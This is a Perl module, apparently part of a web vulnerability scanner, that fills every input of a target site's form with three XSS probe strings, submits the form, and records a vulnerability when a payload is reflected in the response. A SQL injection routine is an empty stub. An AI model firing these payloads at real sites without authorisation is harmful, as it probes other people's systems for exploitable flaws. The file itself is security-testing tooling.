package Norris::Scanner::Attacker;
use strict;
use warnings;
use TheSchwartz::Job;
use base qw( TheSchwartz::Worker );
use WWW::Mechanize;
use Data::Dumper;
use URI;
use lib '../../';
use Norris::Web::Model::DB;

sub work {
    my $class = shift;
    my TheSchwartz::Job $job = shift;
    
    my $args = $job->arg();
    
    #print STDERR Dumper $args;

    my $mech = WWW::Mechanize->new();
    
    my $url         = $args->{'url'};
    my $form        = $args->{'form'};
    my $website_id  = $args->{'id'};
    
    my $point_id = _insert_point_of_interest( $website_id, $form );
    _try_xss_attacks( $point_id, $url, $form, $mech );
    #_try_sql_injection_attacks( $website_id, $form );
    
    $job->completed();
}

sub _insert_point_of_interest {
    my ($website_id, $form) = @_;
    
    my $schema = Norris::Web::Model::DB->new();
    my $point_of_interest = $schema->resultset('PointsOfInterest')->create({
        'url' => $form->action(),
    });
    
    my $point_id = $point_of_interest->id();
    #die Dumper $point_id;
    
    $point_of_interest->add_to_websites( 'id' => $website_id );
    
    return $point_id;
}

sub _try_xss_attacks {
    my ($point_id, $url, $form, $mech) = @_;
      
    my %xss_attack_vectors = (
        
        q[<script>alert("XSS")</script>] => q[<script>alert\("XSS"\)<\/script>],
        q[';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>] => q[';alert\(String\.fromCharCode\(88,83,83\)\)\/\/\\';alert\(String\.fromCharCode\(88,83,83\)\)\/\/\";alert\(String\.fromCharCode\(88,83,83\)\)\/\/\\";alert\(String\.fromCharCode\(88,83,83\)\)\/\/--><\/SCRIPT>\">\'><SCRIPT>alert\(String\.fromCharCode\(88,83,83\)\)<\/SCRIPT>],
        q[3,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>] => q[3,83\)\)\/\/\\";alert(String\.fromCharCode\(88,83,83\)\)\/\/--><\/SCRIPT>\">\'><SCRIPT>alert\(String\.fromCharCode\(88,83,83\)\)<\/SCRIPT>]
    );
    
    my @form_inputs = $form->inputs();
    
    while ( my ($key, $value) = each(%xss_attack_vectors) ) {
    
        foreach my $form_input (@form_inputs) {
            #print STDERR $form_input->name() .'\n';
            $form->value( $form_input->name(), $key );
            print STDERR $form->value( $form_input->name() ) . "\n";
        }
    
        my $request = $form->click();
    
        #print STDERR $request;
    
        eval { $mech->request( $request ) };
    
        if ( $mech->success() ) {
        
            print STDERR "request was successful\n";
                
            print STDERR Dumper $mech->response->code();
            #print STDERR Dumper $mech->content();
        
            #if ( $mech->content() =~ m/<script>alert\("XSS"\)<\/script>/gm ) {
            #if ( $mech->content() =~ m/\';alert\(String\.fromCharCode\(88,83,83\)\)\/\/\\';alert\(String\.fromCharCode\(88,83,83\)\)\/\/\";alert\(String\.fromCharCode\(88,83,83\)\)\/\/\\";alert\(String\.fromCharCode\(88,83,83\)\)\/\/--><\/SCRIPT>\">\'><SCRIPT>alert\(String\.fromCharCode\(88,83,83\)\)<\/SCRIPT>/gm ) {
            if ( $mech->content() =~ m/$value/gm ) {
                print STDERR "--- XSS VULNERABILITY FOUND ---\n";
                _insert_vulnerability( $point_id, 'XSS', $value );
                last;
            } else {
                print STDERR "--- NO XSS FOUND ---\n";
            }
        
        }
    }
}

sub _try_sql_injection_attacks {
    my ($website_id, $form) = @_;
    
}

sub _insert_vulnerability {
    my ($point_id, $type, $input) = @_;
        
    my $schema = Norris::Web::Model::DB->new();
    my $vuln = $schema->resultset('Vulnerabilities')->create({
        'type' => $type,
        'input' => $input,
    });
    $vuln->add_to_points_of_interest( 'id' => $point_id ); 
    
}

1;
